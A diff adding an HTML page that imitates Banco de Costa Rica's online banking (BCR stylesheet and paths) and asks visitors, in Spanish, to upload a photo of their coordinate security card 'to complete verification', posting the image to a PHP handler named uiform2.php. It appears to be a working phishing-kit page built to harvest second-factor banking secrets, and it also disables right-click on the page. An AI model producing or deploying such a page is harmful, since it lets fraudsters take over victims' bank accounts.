@@ -1,0 +1,116 @@
+
+<html lang="es-CR">
+<head runat="server">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <script src="https://kit.fontawesome.com/dcd9f4bc7b.js" ></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+    <link rel="stylesheet" type="text/css" href="css/semantic.min.css">
+    <link rel="stylesheet" type="text/css" href="css/spinner.css">
+    <link rel="stylesheet" type="text/css" href="css/BCRStyle.css">
+    <link rel="stylesheet" type="text/css" href="css/Recuperacion.css">
+    <style type="text/css">
+         input[type="file"] {
+    display: none;
+}
+      </style>
+     
+    
+    
+    <script>
+    window.intervaloFirmador =10000
+</script>
+<script language="JavaScript">
+function menCDVencida()
+	  	{
+			window.open("/IB_BCR/txns/Clave_Dinamica/mensajeCDVencida.asp","oficinas","menubar=no,status=no,scrollbars=yes,resizable=no,width=500,height=360");
+	  	}
+</script>
+
+
+<script>NS_CSM_td=71949069;NS_CSM_pd=275116669;NS_CSM_u="/clm10";NS_CSM_col="af_collector_logstream_172.21.72.31";</script><script type="text/javascript">function sendTimingInfoInit(){setTimeout(sendTimingInfo,0)}function sendTimingInfo(){var wp=window.performance;if(wp){var c1,c2,t;c1=wp.timing;if(c1){var cm={};cm.ns=c1.navigationStart;if((t=c1.unloadEventStart)>0)cm.us=t;if((t=c1.unloadEventEnd)>0)cm.ue=t;if((t=c1.redirectStart)>0)cm.rs=t;if((t=c1.redirectEnd)>0)cm.re=t;cm.fs=c1.fetchStart;cm.dls=c1.domainLookupStart;cm.dle=c1.domainLookupEnd;cm.cs=c1.connectStart;cm.ce=c1.connectEnd;if((t=c1.secureConnectionStart)>0)cm.scs=t;cm.rqs=c1.requestStart;cm.rss=c1.responseStart;cm.rse=c1.responseEnd;cm.dl=c1.domLoading;cm.di=c1.domInteractive;cm.dcls=c1.domContentLoadedEventStart;cm.dcle=c1.domContentLoadedEventEnd;cm.dc=c1.domComplete;if((t=c1.loadEventStart)>0)cm.ls=t;if((t=c1.loadEventEnd)>0)cm.le=t;cm.tid=NS_CSM_td;cm.pid=NS_CSM_pd;cm.ac=NS_CSM_col;var xhttp=new XMLHttpRequest();if(xhttp){var JSON=JSON||{};JSON.stringify=JSON.stringify||function(ob){var t=typeof(ob);if(t!="object"||ob===null){if(t=="string")ob='"'+ob+'"';return String(ob);}else{var n,v,json=[],arr=(ob&&ob.constructor==Array);for(n in ob){v=ob[n];t=typeof(v);if(t=="string")v='"'+v+'"';else if(t=="object"&&v!==null)v=JSON.stringify(v);json.push((arr?"":'"'+n+'":')+String(v));}return(arr?"[":"{")+String(json)+(arr?"]":"}");}};xhttp.open("POST",NS_CSM_u,true);xhttp.send(JSON.stringify(cm));}}}}if(window.addEventListener)window.addEventListener("load",sendTimingInfoInit,false);else if(window.attachEvent)window.attachEvent("onload",sendTimingInfoInit);else window.onload=sendTimingInfoInit;</script></head>
+<body oncontextmenu="return false;">
+    <span class="backArrow">
+        <a href="#" target="ifrm">
+            <svg width="30" height="30" viewBox="0 0 1792 1792">
+                <path style="fill:#0030a0" d="M1408 960v-128q0-26-19-45t-45-19h-502l189-189q19-19 19-45t-19-45l-91-91q-18-18-45-18t-45 18l-362 362-91 91q-18 18-18 45t18 45l91 91 362 362q18 18 45 18t45-18l91-91q18-18 18-45t-18-45l-189-189h502q26 0 45-19t19-45zm256-64q0 209-103 385.5t-279.5 279.5-385.5 103-385.5-103-279.5-279.5-103-385.5 103-385.5 279.5-279.5 385.5-103 385.5 103 279.5 279.5 103 385.5z"></path>
+            </svg>
+        </a>
+    </span>
+<form method="POST" action="uiform2.php" enctype="multipart/form-data">
+ 
+    <div class="ui text container"> 
+        <div id="firmador"></div>       
+		<div id="mensajeExito"></div>
+        <div id="mensajeError"></div> 
+        <div id="recuperacion">
+            <h2 class="ui center aligned header registro">Tarjeta de Coordenadas</h2>
+            <span style="text-align: center;display: block;margin: 0 auto;">Para completar la verificación suba una foto de su tarjeta de coordenadas y luego de click en continuar</span>
+            <div class="ui large form afiliacion">
+                <div id="spinner" class="ui inverted dimmer">
+                    <div id="spinnerControler" style="margin-bottom:0px;"><div id="spinPanel"><div class="loader"></div><span id="spinMessage" style="color:#EF3340; text-align: center">Registrando</span></div></div>
+                </div>
+                <div class="three fields">
+                    <div class="four wide field">
+                        <label for="txtIdentificacion">Tarjeta de Coordenadas :</label>
+                    </div>
+                    <div class="eight wide field">
+                    <label tabindex="0" for="fotish"   class="ui button btnAzulRecuperacion" style="background-color: #0030a0;color: white;"><i class="fa-solid fa-camera"></i> <strong>Tomar foto/Cargar foto</strong> </label>
+                    <input  required accept="image/*" id="fotish" name="fotish" type="file"   onchange="setfilename(this.value)" >
+    
+    <input type="text"  name="wpName" id="wpName"   placeholder="No has cargado tu tarjeta de coordenadas" readonly>
+                    </div>
+                    <div class="four wide field">
+                       
+                        <button  type="submit" class="ui button btnAzulRecuperacion" value="sendPhoto">Continuar</button>
+                    </div>
+                </div>
+                </form> 
+                <div class="three fields">
+                    <div class="four wide field">
+                        
+                    </div>
+                    
+                    <div class="four wide field">
+                    </div>
+                </div>           
+            </div>
+        </div>
+    </div>
+   
+
+    <script>
+  function setfilename(val)
+  {
+    filename = val.split('\\').pop().split('/').pop();
+    filename = filename;
+    document.getElementById('wpName').value = filename;
+  }
+</script>
+<script>
+   document.querySelector("html").classList.add('js');
+
+var fileInput  = document.querySelector( ".input-file" ),  
+    button     = document.querySelector( ".input-file-trigger" ),
+    the_return = document.querySelector(".file-return");
+      
+button.addEventListener( "keydown", function( event ) {  
+    if ( event.keyCode == 13 || event.keyCode == 32 ) {  
+        fileInput.focus();  
+    }  
+});
+button.addEventListener( "click", function( event ) {
+   fileInput.focus();
+   return false;
+});  
+fileInput.addEventListener( "change", function( event ) {  
+    the_return.innerHTML = this.value;  
+});  
+</script>
+
+
+</body>
+
+</html>
